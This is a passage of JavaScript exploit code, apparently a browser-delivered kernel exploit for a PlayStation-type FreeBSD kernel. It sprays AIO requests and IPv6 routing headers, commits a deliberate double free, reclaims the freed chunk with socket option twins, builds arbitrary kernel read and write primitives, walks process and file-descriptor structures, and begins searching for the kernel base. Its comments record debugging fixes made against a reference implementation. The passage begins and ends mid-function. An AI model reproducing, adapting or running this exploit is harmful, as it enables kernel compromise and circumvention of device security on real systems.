                    sc(SYS.aio_multi_delete, leakIds.addr.add32(o * 4), step, outs.addr);
                }

                mark("KADDRS", "evf_cv=" + evfCv + " reqs2=" + reqs2Addr
                    + " reqs1=" + reqs1Aligned + " aio_info=" + aioInfoAddr
                    + " target_id=" + hx(targetId) + " evf=" + hx(evf)
                    + " dirty_fd=" + dirty);
                mark("STAGE-2-DONE", "reqs1/reqs2/aio_info/target_id in hand");

                state("stage 3: crafting the aio queue entry...", "warn");

                sc(SYS.evf_delete, evf);
                mark("EVF-DELETED", hx(evf));

                const NUM_BATCHES = 2;
                const aioIds2 = alloc(AIO_MAX_NUM * NUM_BATCHES * 4);
                buildReqs1(AIO_MAX_NUM, -1);
                function sprayBatches() {
                    for (let b = 0; b < NUM_BATCHES; ++b)
                        sc(SYS.aio_submit_cmd, AIO_CMD_READ | AIO_CMD_MULTI,
                            reqs1.addr, AIO_MAX_NUM, AIO_PRIORITY_HIGH,
                            aioIds2.addr.add32(b * AIO_MAX_NUM * 4));
                }
                function processBatches(cancel, poll, del) {
                    const total = AIO_MAX_NUM * NUM_BATCHES;
                    for (let o = 0; o < total; o += AIO_MAX_NUM) {
                        const a = aioIds2.addr.add32(o * 4);
                        if (cancel) sc(SYS.aio_multi_cancel, a, AIO_MAX_NUM, outs.addr);
                        if (poll) sc(SYS.aio_multi_poll, a, AIO_MAX_NUM, outs.addr);
                        if (del) sc(SYS.aio_multi_delete, a, AIO_MAX_NUM, outs.addr);
                    }
                }
                let qLeaked = false;
                for (let r = 0; r < EVF_ATTEMPTS && !qLeaked; ++r) {
                    if (r) await new Promise(r2 => setTimeout(r2, 0));
                    sprayBatches();
                    await breathe();
                    const len = getRthdr(dirty, 0x800);
                    const cmd = leakRthdr.dv.getUint32(0, true);
                    if (len === 8 && cmd === AIO_CMD_READ) {
                        qLeaked = true;
                        processBatches(true, false, false);
                        mark("QUEUE-LEAKED", "aio queue entry over the rthdr after "
                            + r + " round(s), len=" + len + " ar2_cmd=" + hx(cmd));
                        break;
                    }
                    processBatches(true, true, true);
                }
                if (!check("aio-queue-entry-leaked-rthdr", qLeaked,
                    qLeaked ? "" : EVF_ATTEMPTS + " rounds, rthdr never became "
                        + "an aio_entry")) return false;

                sprayRthdr.dv.setUint32(4, 5, true);
                put(sprayRthdr.dv, AR2_INFO, reqs1Aligned);
                put(sprayRthdr.dv, AR2_BATCH, reqs2Addr.add32(REQS3_OFF));
                sprayRthdr.dv.setUint32(REQS3_OFF + AR3_NUM_REQS, 1, true);
                sprayRthdr.dv.setUint32(REQS3_OFF + AR3_REQS_LEFT, 0, true);
                sprayRthdr.dv.setUint32(REQS3_OFF + AR3_STATE, AIO_STATE_COMPLETE, true);
                sprayRthdr.dv.setUint32(REQS3_OFF + AR3_DONE, 0, true);

                sprayRthdr.dv.setUint32(REQS3_OFF + AR3_LOCK_FLAGS, 0x67b0000, true);
                put(sprayRthdr.dv, REQS3_OFF + AR3_LOCK, new int64(1, 0));
                mark("BATCH-CRAFTED", "ar2_info=" + reqs1Aligned
                    + " ar2_batch=" + reqs2Addr.add32(REQS3_OFF)
                    + " ar3_state=COMPLETE");

                if (sc(SYS.close, dirty).i32 === -1) {
                    check("dirty-socket-closed", false, "fd " + dirty);
                    return false;
                }
                mark("DIRTY-CLOSED", "fd " + dirty + " released the aio_entry");
                twinSocks.length = 0;

                let reqId = 0, dirty2 = -1;
                const total2 = AIO_MAX_NUM * NUM_BATCHES;
                /*
                SPEED. Every `await breathe()` is a real macrotask turn
                (setTimeout(0)), not a microtask, and the console's timer
                granularity is ~4 ms. Called once per socket in a 256-socket
                loop that is ~1 SECOND of pure scheduling per round, on top of
                the syscalls -- and this loop is only reached once aalentry is
                already crafted. netctrl yields once per ROUND, not per
                element, and that is why its back half feels instant.
                Breathe every 32 elements instead: still far under the
                watchdog window (32 x a few hundred us), ~32x fewer turns.
                */
                for (let r = 0; r < EVF_ATTEMPTS && dirty2 < 0; ++r) {
                    if (r) await new Promise(r2 => setTimeout(r2, 0));
                    for (let i = 0; i < ipv6Socks.length; ++i) {
                        if ((i & 0x1f) === 0x1f) await breathe();
                        sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6, IPV6_RTHDR,
                            sprayRthdr.addr, sprayRthdrLen);
                    }
                    for (let o = 0; o < total2 && dirty2 < 0; o += AIO_MAX_NUM) {
                        await breathe();
                        for (let z = 0; z < AIO_MAX_NUM; ++z)
                            outs.dv.setInt32(z * 4, -1, true);
                        sc(SYS.aio_multi_cancel, aioIds2.addr.add32(o * 4),
                            AIO_MAX_NUM, outs.addr);
                        let reqIdx = -1;
                        for (let z = 0; z < AIO_MAX_NUM; ++z)
                            if (outs.dv.getUint32(z * 4, true) === AIO_STATE_COMPLETE) {
                                reqIdx = z; break;
                            }
                        if (reqIdx < 0) continue;
                        const abs = o + reqIdx;
                        reqId = aioIds2.dv.getUint32(abs * 4, true);

                        sc(SYS.aio_multi_poll, aioIds2.addr.add32(abs * 4), 1, outs.addr);
                        aioIds2.dv.setUint32(abs * 4, 0, true);
                        for (let k = 0; k < ipv6Socks.length; ++k) {
                            if ((k & 0x1f) === 0x1f) await breathe();
                            if (getRthdr(ipv6Socks[k], 0x80) === -1) continue;
                            if (leakRthdr.dv.getUint8(REQS3_OFF + AR3_DONE) !== 0) {
                                dirty2 = ipv6Socks[k];

                                /*
                                RESTORED TO THE REFERENCE.

                                An earlier edit removed this and only kept
                                `ipv6Socks.splice(k, 1)` / `twinSocks.push`,
                                on the theory that clearing the other sockets'
                                rthdrs here would free the live crafted aio
                                entry and double-free it. That theory is
                                DISPROVEN by the reference, which does exactly
                                this at lapse-cssfontface.js:926-938:

                                    rthdr_twins[0] = ipv6_socks[k];
                                    ipv6_socks.splice(k, 1);
                                    for (let i = 0; i < ipv6_socks.length; i++)
                                        free_rthdr(ipv6_socks[i]);
                                    ipv6_socks.push(make_socket(...));

                                The reference runs on hardware and does not
                                panic, so the free-and-refill is required, not
                                harmful: those sockets still hold the sprayed
                                reqs2/aio_batch content and must be released
                                for the reclaim to land. Restoring it verbatim.
                                */
                                twinSocks.push(dirty2);
                                ipv6Socks.splice(k, 1);
                                for (let m = 0; m < ipv6Socks.length; ++m)
                                    sc(SYS.setsockopt, ipv6Socks[m], IPPROTO_IPV6,
                                        IPV6_RTHDR, 0, 0);
                                const ns = sc(SYS.socket, AF_INET6,
                                    SOCK_DGRAM, 0).i32;
                                if (ns !== -1) ipv6Socks.push(ns);
                                mark("BATCH-OVERWRITTEN", "req_id=" + hx(reqId)
                                    + " dirty_fd=" + dirty2 + " after " + r
                                    + " round(s) -- freed "
                                    + ipv6Socks.length + " other rthdr(s), added fd "
                                    + ns);
                                break;
                            }
                        }
                    }
                }
                if (!check("crafted-aio-queue-entry-installed", dirty2 >= 0,
                    dirty2 >= 0 ? "" : "never observed ar3_done being set"))
                    return false;

                /*
                STAGE-3 ORDERING / HONEST-STATE / WATCHDOG FIX.

                The crafted aio queue entry is now INSTALLED on a live ipv6
                socket (the PROOF-OK above). From this point the run has
                committed a real double free: the next aio_multi_delete frees
                the shared 0x100 allocation twice. The reference treats this
                the same way -- its double_free_reqs1 free -> poll -> delete
                sequence is mirrored below, and its cleanup_fail() literally
                says "Reboot before it crash!".

                committed2 is therefore set HERE, before the lethal section,
                not after TARGET-ARMED. Previously a kernel fault between the
                free and TARGET-ARMED left committed2 false, so teardown
                believed nothing had committed and skipped the reboot banner --
                the "aio_queue_entry crash" looked unexplained in the log.

                The target poll also gets its OWN 4-byte buffer (targetIdBuf),
                matching the reference: it allocates target_id_p separately
                from the target_ids pair it hands to aio_multi_delete. Sharing
                one buffer between the poll and the delete inside the same
                window is exactly the kind of aliasing that turns a benign
                timing miss into a fault.

                And breathe() on either side: processBatches is up to 256 ROP
                syscalls and the delete is the kill shot; the watchdog must not
                be racing the exploit into that window.
                */
                committed2 = true;

                await breathe();
                processBatches(false, true, true);

                const targetIdBuf = alloc(4);
                targetIdBuf.dv.setUint32(0, targetId, true);
                await breathe();
                sc(SYS.aio_multi_poll, targetIdBuf.addr, 1, outs.addr);

                const targetIds = alloc(8);
                targetIds.dv.setUint32(0, reqId, true);
                targetIds.dv.setUint32(4, targetId, true);
                mark("TARGET-ARMED", "req_id=" + hx(reqId) + " target_id="
                    + hx(targetId) + " -- both deletes now free the same 0x100 "
                    + "allocation");

                const tDel = Date.now();
                await breathe();
                sc(SYS.aio_multi_delete, targetIds.addr, 2, outs.addr);
                const delMs = Date.now() - tDel;
                const derr0 = outs.dv.getUint32(0, true);
                const derr1 = outs.dv.getUint32(4, true);
                if (delMs > 300)
                    mark("DELETE-SLOW", "aio_multi_delete of the target pair took "
                        + delMs + " ms. Normal is under 100. The 0x100 chunk has "
                        + "been free and unclaimed for that whole time, so the "
                        + "reclaim below is likely to fail -- and if it does, "
                        + "that is the reason, not the spray.");

                let ptwins = null;
                const tclass = alloc(4), tclassLen = alloc(4);
                const tPtwins = Date.now();
                for (let r = 0; r < EVF_ATTEMPTS && !ptwins; ++r) {
                    if (r) await new Promise(r2 => setTimeout(r2, 0));
                    /*
                    VISIBILITY FIX. This loop is the longest silent stretch in
                    the whole run: up to 128 rounds x (256 setsockopt + 256
                    getsockopt), and it only marked on FAILURE. TARGET-ARMED is
                    the last line you see for tens of seconds and there is no
                    way to tell progress from a hang. Emit a heartbeat every 8
                    rounds, same cadence the other reclaim scans use.
                    */
                    if (r && (r % 8) === 0)
                        mark("PKTOPTS-SEARCH", "round " + r + "/" + EVF_ATTEMPTS
                            + " after " + (Date.now() - tPtwins) + " ms");
                    for (let i = 0; i < ipv6Socks.length; ++i)
                        sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6,
                            IPV6_2292PKTOPTIONS, 0, 0);
                    for (let i = 0; i < ipv6Socks.length; ++i) {
                        if ((i & 0x1f) === 0x1f) await breathe();
                        tclass.dv.setInt32(0, i, true);
                        sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6,
                            IPV6_TCLASS, tclass.addr, 4);
                    }
                    for (let j = 0; j < ipv6Socks.length; ++j) {
                        if ((j & 0x1f) === 0x1f) await breathe();
                        tclassLen.dv.setInt32(0, 4, true);
                        if (sc(SYS.getsockopt, ipv6Socks[j], IPPROTO_IPV6,
                            IPV6_TCLASS, tclass.addr, tclassLen.addr).i32 === -1)
                            continue;
                        const idx = tclass.dv.getInt32(0, true);
                        if (idx === j || idx < 0 || idx >= ipv6Socks.length) continue;
                        if (ipv6Socks[idx] === ipv6Socks[j]) { dupSeen++; continue; }
                        ptwins = { round: r, a: ipv6Socks[j], b: ipv6Socks[idx] };
                        const hi2 = Math.max(j, idx), lo2 = Math.min(j, idx);
                        ipv6Socks.splice(hi2, 1);
                        ipv6Socks.splice(lo2, 1);
                        for (let m = 0; m < 2; ++m) {
                            const ns = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
                            if (ns === -1) continue;
                            tclass.dv.setInt32(0, ipv6Socks.length, true);
                            sc(SYS.setsockopt, ns, IPPROTO_IPV6, IPV6_TCLASS,
                                tclass.addr, 4);
                            ipv6Socks.push(ns);
                        }
                        break;
                    }
                }
                mark("DELETE-ERRS", hx(derr0) + "," + hx(derr1)
                    + "   (" + delMs + " ms)");
                check("target-deletes-reported-success",
                    derr0 === 0 && derr1 === 0, hx(derr0) + "," + hx(derr1));
                if (ptwins && ptwins.a === ptwins.b) {
                    mark("FALSE-TWINS", "both pktopts twins are fd " + ptwins.a
                        + " -- that is one socket seen twice, not an aliased "
                        + "allocation. refusing to build a read primitive on it.");
                    ptwins = null;
                }
                if (!check("0x100-chunk-reclaimed-pktopts", !!ptwins,
                    ptwins ? ("pktopts twins are fds " + ptwins.a + " and "
                        + ptwins.b + " after " + ptwins.round + " round(s)")
                        : "no pktopts twins found -- the 0x100 chunk is "
                        + "dangling, reboot now"))
                    return false;

                pktoptsTwins.push(ptwins.a, ptwins.b);
                mark("STAGE-3-DONE", "pktopts twins fds "
                    + pktoptsTwins.join(" and ")
                    + " alias one 0x100 allocation. make_karw is step 4i, and "
                    + "it is the first point where any of this can be repaired.");

                state("stage 4: kernel read...", "warn");

                sprayRthdr.u8.fill(0);
                const karwLen = buildRthdr(sprayRthdr, 0x100);
                const pktinfoSelf = reqs1Aligned.add32(PKTOPTS_PKTINFO);
                put(sprayRthdr.dv, PKTOPTS_PKTINFO, pktinfoSelf);
                mark("KARW-SPRAY", "rthdr len 0x" + karwLen.toString(16)
                    + ", ip6po_pktinfo -> itself at " + pktinfoSelf);

                if (sc(SYS.close, pktoptsTwins[1]).i32 === -1) {
                    check("second-pktopts-twin-closed", false,
                        "fd " + pktoptsTwins[1]);
                    return false;
                }
                mark("PKTOPTS-TWIN-CLOSED", "fd " + pktoptsTwins[1]
                    + " freed the pktopts; fd " + pktoptsTwins[0]
                    + " still points at it");

                const tcBuf = alloc(4), tcLen = alloc(4);
                let karwSock = -1;
                for (let r = 0; r < EVF_ATTEMPTS && karwSock < 0; ++r) {
                    if (r) await new Promise(r2 => setTimeout(r2, 0));
                    for (let i = 0; i < ipv6Socks.length; ++i) {
                        if ((i & 0x1f) === 0x1f) await breathe();
                        sprayRthdr.dv.setUint32(PKTOPTS_TCLASS,
                            ((i << 0x10) | KARW_MARKER) >>> 0, true);
                        sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6,
                            IPV6_RTHDR, sprayRthdr.addr, karwLen);
                    }
                    tcLen.dv.setInt32(0, 4, true);
                    if (sc(SYS.getsockopt, pktoptsTwins[0], IPPROTO_IPV6,
                        IPV6_TCLASS, tcBuf.addr, tcLen.addr).i32 === -1)
                        continue;
                    const marker = tcBuf.dv.getUint32(0, true) >>> 0;
                    if ((marker & 0xffff) === KARW_MARKER) {
                        const which = marker >>> 0x10;
                        if (which < ipv6Socks.length) {
                            karwSock = ipv6Socks[which];
                            ipv6Socks.splice(which, 1);
                            mark("PKTOPTS-OVERWRITTEN", "fd " + karwSock
                                + " now backs fd " + pktoptsTwins[0]
                                + "'s pktopts, after " + r + " round(s)");
                        }
                    }
                }
                if (!check("rthdr-sprayed-live-pktopts",
                    karwSock >= 0,
                    karwSock >= 0 ? "" : "the 0x1337 marker never appeared "
                        + "in IPV6_TCLASS")) return false;
                pktoptsTwins[1] = karwSock;

                const pktinfo = alloc(0x14), nhopLen = alloc(4), kbuf = alloc(0x20);
                let kreadCalls = 0, kreadFail = 0;

                let kwriteCalls = 0;

                function pktinfoSet(fill) {
                    kwriteCalls++;
                    pktinfo.u8.fill(0);
                    fill(pktinfo.dv);
                    return sc(SYS.setsockopt, pktoptsTwins[0], IPPROTO_IPV6,
                        IPV6_PKTINFO, pktinfo.addr, 0x14).i32;
                }

                function pktinfoGet() {
                    pktinfo.u8.fill(0);
                    optLen.dv.setInt32(0, 0x14, true);
                    const r = sc(SYS.getsockopt, pktoptsTwins[0], IPPROTO_IPV6,
                        IPV6_PKTINFO, pktinfo.addr, optLen.addr).i32;
                    return r === 0 ? new int64(pktinfo.dv.getUint32(0, true),
                        pktinfo.dv.getUint32(4, true))
                        : null;
                }

                function kread8(addr) {
                    kreadCalls++;
                    let off = 0;
                    kbuf.u8.fill(0);
                    /*
                    HANG FIX. This was `while (off < 8)` with
                    `else off += n`, where n came from getInt32 of the
                    kernel-written remaining length. A negative or bogus n
                    moved off BACKWARDS or nowhere, so the loop never
                    terminated -- an infinite SYNCHRONOUS stretch, which is
                    the "stage 4: kernel read..." watchdog hang. kread8 is
                    not async, so no outer breathe() can rescue it.

                    Bound it by iteration count as well as by offset, and
                    treat any non-positive or oversized n as a 1-byte step.
                    Worst case this yields a wrong 8 bytes, never a hang.
                    */
                    for (let guard = 0; guard < 16 && off < 8; ++guard) {
                        pktinfo.u8.fill(0);
                        put(pktinfo.dv, 0, pktinfoSelf);
                        put(pktinfo.dv, 8, addr.add32(off));
                        if (sc(SYS.setsockopt, pktoptsTwins[0], IPPROTO_IPV6,
                            IPV6_PKTINFO, pktinfo.addr, 0x14).i32 === -1) {
                            kreadFail++; return null;
                        }
                        nhopLen.dv.setInt32(0, 8 - off, true);
                        if (sc(SYS.getsockopt, pktoptsTwins[0], IPPROTO_IPV6,
                            IPV6_NEXTHOP, kbuf.addr.add32(off),
                            nhopLen.addr).i32 === -1) {
                            kreadFail++; return null;
                        }
                        const n = nhopLen.dv.getInt32(0, true);
                        if (n <= 0 || n > 8 - off) off += 1;
                        else off += n;
                    }
                    return new int64(kbuf.dv.getUint32(0, true),
                        kbuf.dv.getUint32(4, true));
                }

                const cvWord = kread8(evfCv);
                let kstr = "";
                if (cvWord) {
                    for (let i = 0; i < 8; ++i) {
                        const c = kbuf.dv.getUint8(i);
                        if (c === 0) break;
                        kstr += String.fromCharCode(c);
                    }
                }
                mark("KREAD-EVF-CV", evfCv + " -> " + (cvWord || "FAILED")
                    + "  as text: '" + kstr + "'");
                if (!check("kernel-memory-reads-string-evf",
                    kstr === "evf cv", "got '" + kstr + "'")) return false;

                const myPid = sc(SYS.getpid).i32;
                let curproc = null, curprocFrom = "none";

                if (kLeakFp) {
                    const pipeL = kread8(kLeakFp);

                    let cnt = null, sz = null, buf = null;
                    if (pipeL && kptr(pipeL)) {
                        cnt = kread8(pipeL);
                        sz = kread8(pipeL.add32(8));
                        buf = kread8(pipeL.add32(0x10));
                    }
                    const readEnd = !!buf && kptr(buf) && !!sz && sz.hi === 0x4000;
                    const writeEnd = !!buf && buf.low === 0 && buf.hi === 0
                        && !!sz && sz.low === 0 && sz.hi === 0;
                    mark("SIGIO-PIPE", "ar2_file " + kLeakFp + " -> f_data "
                        + (pipeL || "?") + "   pipebuf cnt|in=" + (cnt || "?")
                        + " out|size=" + (sz || "?") + " buffer=" + (buf || "?")
                        + "   looks like " + (readEnd ? "a read end"
                            : writeEnd ? "a write end (no buffer of its own, "
                                + "which is what pipe_create(wpipe, 0) makes)"
                                : "neither"));

                    if (pipeL && kptr(pipeL)) {

                        const sigBefore = kread8(pipeL.add32(0xd0));
                        const pidBuf = alloc(4);
                        pidBuf.dv.setInt32(0, myPid, true);
                        const io = sc(SYS.ioctl, leakPipe[1], FIOSETOWN,
                            pidBuf.addr).i32;
                        const sigAfter = io === 0
                            ? kread8(pipeL.add32(0xd0)) : null;
                        mark("SIGIO-WALK", "ioctl(FIOSETOWN)=" + io
                            + "  pipe_sigio before=" + (sigBefore || "?")
                            + " after=" + (sigAfter || "?"));
                        const appeared = !!sigBefore && sigBefore.low === 0
                            && sigBefore.hi === 0 && !!sigAfter && kptr(sigAfter);
                        check("pipe_sigio-null-became-kernel-pointer"
                            + "exactly when FIOSETOWN was called", appeared,
                            appeared ? "so ar2_file+0 is f_data and +0xd0 is "
                                + "pipe_sigio, both confirmed by a transition "
                                + "we caused"
                                : "no transition, so this walk is not trusted");

                        if (appeared) {
                            const cand = kread8(sigAfter);
                            const pid2 = (cand && kptr(cand))
                                ? kread8(cand.add32(0xb0)) : null;
                            const ok = !!pid2 && pid2.low === myPid && pid2.hi === 0;
                            mark("SIGIO-PID", "sigio->proc=" + (cand || "?")
                                + "  p_pid=" + (pid2 ? pid2.low : "?")
                                + " getpid=" + myPid);
                            check("proc-sigio-names-proc", ok,
                                ok ? "p_pid matches getpid(), so this is curproc "
                                    + "-- with no aio_info anywhere in the path"
                                    : "p_pid " + (pid2 ? pid2.low : "?")
                                    + " -- rejected");
                            if (ok) { curproc = cand; curprocFrom = "sigio"; }
                        }
                    }
                }

                let aioCurproc = null;
                /*
                FIX. The aio_info route used to be five straight reads of
                aioInfoAddr+8 with a 2 ms sleep between. If THAT ONE address
                was reclaimed (which is exactly what the old comment says
                happened), no amount of retrying the same address helps. Since
                the 0x800 leak window is still live and was re-read for this
                very entry, sweep the whole window for any qword that looks
                like a proc and whose p_pid names us. That is the same
                structural test the sigio route uses, applied to every
                candidate the window offers instead of one fixed offset.
                */
                for (let t = 0; t < 5 && !(aioCurproc && kptr(aioCurproc)); ++t) {
                    aioCurproc = kread8(aioInfoAddr.add32(8));
                    if (aioCurproc && kptr(aioCurproc)) break;
                    preTs.u8.fill(0);
                    preTs.dv.setUint32(8, 2000000, true);
                    sc(SYS.nanosleep, preTs.addr, 0);
                }
                if (!(aioCurproc && kptr(aioCurproc)) && reqs2Base >= 0) {
                    getRthdr(dirty, 0x800);
                    let sweepHits = 0, sweepPid = null;
                    for (let o = 0; o + 8 <= 0x800; o += 8) {
                        const cand = new int64(leakRthdr.dv.getUint32(o, true),
                            leakRthdr.dv.getUint32(o + 4, true));
                        if (!kptr(cand)) continue;
                        sweepHits++;
                        const pid2 = kread8(cand.add32(0xb0));
                        if (pid2 && pid2.low === myPid && pid2.hi === 0) {
                            aioCurproc = cand; sweepPid = o;
                            mark("CURPROC-WINDOW-SWEEP", "found a proc at "
                                + "leak_window+0x" + o.toString(16) + " = "
                                + cand + " whose p_pid is " + myPid
                                + "  (" + sweepHits + " kernel pointers scanned)");
                            break;
                        }
                    }
                    if (!(aioCurproc && kptr(aioCurproc)))
                        mark("CURPROC-WINDOW-SWEEP-MISS", sweepHits
                            + " kernel pointer(s) in the 0x800 window, none "
                            + "named pid " + myPid
                            + " -- the window may no longer cover a live proc");
                }
                mark("KREAD-CURPROC", "aio_info+8 = "
                    + (aioCurproc ? aioCurproc.toString() : "FAILED")
                    + (aioCurproc && kptr(aioCurproc) ? "  (kernel pointer)"
                        : "  (NOT a kernel pointer -- ar2_info was reclaimed)"));
                if (aioCurproc && kptr(aioCurproc) && !curproc) {
                    curproc = aioCurproc; curprocFrom = "aio_info";
                }
                if (curproc && aioCurproc && kptr(aioCurproc))
                    check("curproc-routes-agree",
                        sameI64(curproc, aioCurproc),
                        curprocFrom === "sigio"
                            ? "sigio " + curproc + " vs aio_info " + aioCurproc
                            : "");

                if (!(curproc && kptr(curproc))) {
                    mark("CURPROC-UNAVAILABLE", "neither route produced a proc. "
                        + "ar2_file=" + (kLeakFp || "null") + ", aio_info at "
                        + aioInfoAddr + " reads " + (aioCurproc || "null")
                        + ". This gates the ofiles walk only; the kernel WRITE "
                        + "below is unaffected.");
                    /*
                    HONEST-FAILURE FIX. This used to mark-and-continue, so a
                    run that never resolved curproc -- and therefore skipped
                    the entire pipe/ofiles walk, KernelView, repair, jailbreak,
                    kpatch and payload stages -- still reported fail=0. That is
                    exactly the "pass=51 fail=0 but Partial success" run.

                    Record it as a real check failure so the summary tells the
                    truth. The run continues (the kread8/kwrite socket-option
                    path and stage 6's kernel-base scan do work without
                    curproc), but it can no longer look clean.
                    */
                    check("curproc-resolved-for-ofiles-walk", false,
                        "ar2_file=" + (kLeakFp || "null")
                        + " aio_info+8=" + (aioCurproc || "null")
                        + " -- neither the sigio walk nor the aio_info read "
                        + "produced a kernel proc pointer, so pipeM/pipeS and "
                        + "every stage that needs them are skipped");
                } else {
                    mark("CURPROC", curproc + " via " + curprocFrom);
                }
                const haveCurproc = !!(curproc && kptr(curproc));
                if (haveCurproc) {
                    check("curproc-kernel-pointer", true, curproc.toString());
                    const pPid = kread8(curproc.add32(0xb0));
                    mark("KREAD-PID", "p_pid=" + (pPid ? pPid.low : "?")
                        + " getpid=" + myPid);
                    check("pid-read-kernel-matches-getpid",
                        !!pPid && pPid.low === myPid && pPid.hi === 0,
                        (pPid ? pPid.low : "?") + " vs " + myPid);

                    const pFd = kread8(curproc.add32(0x48));
                    const fdtOfiles = pFd ? kread8(pFd) : null;
                    mark("KREAD-FDT", "p_fd=" + (pFd || "?")
                        + " fdt_ofiles=" + (fdtOfiles || "?"));
                    check("file-descriptor-table-reachable",
                        !!fdtOfiles && kptr(fdtOfiles),
                        fdtOfiles ? fdtOfiles.toString() : "null");

                    if (kLeakFp && fdtOfiles && kptr(fdtOfiles)) {
                        const slot = kread8(fdtOfiles.add32(leakPipe[1] * 8));
                        const match = !!slot && sameI64(slot, kLeakFp);
                        mark("OFILES-CROSSCHECK", "ofiles[" + leakPipe[1] + "] = "
                            + (slot || "?") + "   ar2_file said " + kLeakFp);
                        check("ofiles-table-contains-struct-file"
                            + "stage 2 leaked", match,
                            match ? "so fdt_ofiles is correct and entries are 8 "
                                + "bytes apart, not FreeBSD's 0x30"
                                : "the table, the stride, or curproc is wrong");
                    }

                    if (fdtOfiles && kptr(fdtOfiles) && pipesOk) {
                        const FILEDESCENT_SIZE = 8;
                        function pipeFData(fd) {
                            const fp = kread8(fdtOfiles.add32(fd * FILEDESCENT_SIZE));
                            if (!fp || !kptr(fp)) return null;
                            const d = kread8(fp);
                            return (d && kptr(d)) ? { fp: fp, data: d } : null;
                        }
                        const m = pipeFData(masterPipe[0]);
                        const sl = pipeFData(slavePipe[0]);
                        mark("PIPE-FILE", "master fd " + masterPipe[0] + " file="
                            + (m ? m.fp : "?") + " f_data=" + (m ? m.data : "?"));
                        mark("PIPE-FILE", "slave  fd " + slavePipe[0] + " file="
                            + (sl ? sl.fp : "?") + " f_data=" + (sl ? sl.data : "?"));
                        const both = !!m && !!sl && m.data.low !== sl.data.low;

                        if (both) {
                            pipeM = m.data; pipeS = sl.data;
                            pipeMFp = m.fp; pipeSFp = sl.fp;
                            kFdtOfiles = fdtOfiles;
                        }
                        check("pipes-struct-pipe-addresses-read",
                            both, both ? "" : "one of them did not resolve");
                        if (both) {

                            const pb = [];
                            for (let o = 0; o < 0x18; o += 8)
                                pb.push(kread8(m.data.add32(o)));
                            mark("PIPEBUF", "master pipebuf now: "
                                + pb.map(function (x) { return x ? x.toString() : "?"; })
                                    .join(" "));
                        }
                    } else if (!pipesOk) {
                        mark("PIPE-WALK-SKIPPED", "no pipe pairs to walk");
                    }
                } else {
                    mark("FDT-WALK-SKIPPED", "no live curproc, so the ofiles "
                        + "walk cannot run. That walk is only needed for the "
                        + "PIPE route to fast R/W -- the write primitive below "
                        + "comes out of ip6po_pktinfo and needs none of it.");
                }

                mark("KREAD-STATS", kreadCalls + " kread8 calls, "
                    + kreadFail + " failed");

                state("stage 5: kernel write...", "warn");

                const kwTarget = pktinfoSelf.sub32(8);
                const KW_A = 0x4b571337, KW_B = 0xfeedc0de;

                const before = kread8(kwTarget);
                mark("KWRITE-TARGET", kwTarget + " currently holds "
                    + (before || "unreadable"));

                const aimRc = pktinfoSet(function (dv) {
                    put(dv, 0, kwTarget);
                    put(dv, 8, new int64(0, 0));
                });
                const seen = pktinfoGet();
                const aimOk = aimRc === 0 && seen !== null && before !== null
                    && seen.low === before.low && seen.hi === before.hi;
                mark("KWRITE-AIM", "ip6po_pktinfo -> " + kwTarget
                    + " (setsockopt=" + aimRc + "); reading back through it "
                    + "gives " + (seen || "null") + ", target held " + (before || "?"));
                check("write-pointer-landed-where-aimed", aimOk,
                    aimOk ? "" : "getsockopt(IPV6_PKTINFO) does not match an "
                        + "independent kread8 of the target -- NOT writing");

                if (!aimOk) {

                    for (let r = 0; r < 8; ++r) {
                        if (r) await new Promise(r2 => setTimeout(r2, 0));
                        put(sprayRthdr.dv, PKTOPTS_PKTINFO, pktinfoSelf);
                        for (let i = 0; i < ipv6Socks.length; ++i) {
                            if ((i & 0x1f) === 0x1f) await breathe();
                            sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6,
                                IPV6_RTHDR, sprayRthdr.addr, karwLen);
                        }
                        const c = kread8(evfCv);
                        if (c && kbuf.dv.getUint8(0) === 0x65) break;
                    }
                    mark("KWRITE-ABORTED", "aim=unconfirmed write=none "
                        + "selfref=restored");
                } else {

                    const wrc = pktinfoSet(function (dv) {
                        dv.setUint32(0, KW_A, true);
                        dv.setUint32(4, KW_B, true);
                        put(dv, 8, pktinfoSelf);
                    });
                    const back = kread8(kwTarget);
                    const wroteOk = wrc === 0 && back !== null
                        && back.low === KW_A && back.hi === KW_B;
                    mark("KWRITE", "wrote " + hx(KW_B) + hx(KW_A).slice(2)
                        + " at " + kwTarget + " (setsockopt=" + wrc
                        + "), kread8 returns " + (back || "unreadable"));
                    check("arbitrary-kernel-address-took-20",
                        wroteOk, wroteOk ? "" : "read back " + (back || "null"));

                    const cvAgain = kread8(evfCv);
                    let kstr2 = "";
                    if (cvAgain) for (let i = 0; i < 8; ++i) {
                        const c = kbuf.dv.getUint8(i);
                        if (c === 0) break;
                        kstr2 += String.fromCharCode(c);
                    }
                    check("read-primitive-survives-write", kstr2 === "evf cv",
                        "'" + kstr2 + "' after " + kwriteCalls + " pktinfo writes");
                    check("ip6po_pktinfo-not-left-interior",
                        kstr2 === "evf cv",
                        "a dangling interior pointer here is a free() of a "
                        + "non-allocation at teardown -- that is what panicked "
                        + "the last run");

                    if (wroteOk && kstr2 === "evf cv")
                        mark("KERNEL-RW", "read=ok write=ok via=pktopts "
                            + "aim=verified selfref=restored");
                }

                state("stage 6: locating the kernel base...", "warn");
                const KSTR_RESIDUE = evfCv.low & 0x3fff;
                const KSTR_LO = params.has("kstrlo")
                    ? parseInt(params.get("kstrlo"), 16) : 0x780000;
                const KSTR_HI = params.has("kstrhi")
                    ? parseInt(params.get("kstrhi"), 16) : 0x800000;
                const ELF_MAGIC = 0x464c457f;

                mark("KSTR-PLAN", "residue=0x" + KSTR_RESIDUE.toString(16)
                    + " window=0x" + KSTR_LO.toString(16) + "..0x"
                    + KSTR_HI.toString(16) + " step=0x4000 order=ascending");
                if (KSTR_RESIDUE !== 0x26f)
                    mark("KSTR-RESIDUE-ODD", "expected 0x26f from the earlier "
                        + "runs but this one gives 0x" + KSTR_RESIDUE.toString(16)
                        + " -- the constraint may not hold, treat the result "
                        + "with suspicion");

                let first = KSTR_LO;
                while ((first & 0x3fff) !== KSTR_RESIDUE) first++;
                let kstrOff = -1, kbase = null, tried = 0, lastRead = null;
                for (let off = first; off <= KSTR_HI; off += 0x4000) {
                    await breathe();
                    const cand = evfCv.sub32(off);
